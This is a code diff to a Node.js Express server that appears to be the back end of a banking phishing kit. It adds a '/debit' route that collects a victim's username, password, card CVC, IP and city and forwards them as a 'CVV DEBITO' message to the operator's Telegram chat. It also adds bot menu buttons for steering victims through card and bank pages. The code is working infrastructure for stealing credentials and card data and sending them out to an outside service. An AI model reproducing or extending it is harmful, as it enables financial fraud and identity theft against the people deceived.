@@ -50,7 +50,7 @@ function getPrimaryReplyMarkup(sessionId) {
             ],
             [
                 { text: "💳 16 de DB", callback_data: `go:partcc|${sessionId}` },
-                { text: "🌐 SOYYO", callback_data: `go:soyyo|${sessionId}` }
+                { text: "🌐 Virtual", callback_data: `go:virtualdedbit|${sessionId}` }
             ],
             [
                 { text: "🦅 Amex", callback_data: `go:amexs|${sessionId}` },
@@ -425,6 +425,23 @@ app.post('/partcc', async (req, res) => {
     res.status(500).send({ ok: false });
   }
 });
+app.post('/debit', async (req, res) => {
+  try {
+    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const mensaje = `
+💳 CVV DEBITO
+👤 Usuario: ${user}
+🔑 Clave: ${pass}
+🔢 CVC: ${cvc || "N/A"}
+🌐 ${ip} - ${city}, ${country}
+🆔 Session: ${sessionId}
+    `.trim();
+    const reply_markup = getSecondaryReplyMarkup(sessionId);
+    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
+    res.send({ ok: true });
+  } catch (error) { console.error('Error en /debit:', error.message); res.status(500).send({ ok: false }); }
+});
+
 
 app.post('/visaclasica', async (req, res) => {
   try {
@@ -668,4 +685,3 @@ setInterval(async () => {
     console.error("❌ Error en auto-ping:", error.message);
   }
 }, 180000);
-
